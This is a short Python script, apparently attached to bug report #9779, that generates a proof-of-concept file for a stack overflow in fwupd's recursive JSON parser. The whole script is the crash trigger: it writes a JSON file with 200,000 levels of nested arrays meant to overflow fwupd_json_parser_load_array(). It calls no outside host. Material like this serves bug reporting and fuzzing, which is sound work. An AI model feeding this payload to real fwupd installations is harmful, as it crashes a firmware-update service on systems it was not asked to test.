#!/usr/bin/env python3
"""Generate PoC for fwupd-logitech-stack-overflow (issue #9779).

Deep-nested JSON (~200,000 levels of nested arrays) overflows the
recursive descent fwupd_json_parser_load_array() stack.
"""

def create_poc(output='poc.bin'):
    depth = 200000
    content = '{"fileVersion": "1", "contents": ' + '[' * depth + ']' * depth + '}'
    with open(output, 'wb') as f:
        f.write(content.encode())
    print(f"wrote {output} ({len(content)} bytes)")


if __name__ == '__main__':
    create_poc()
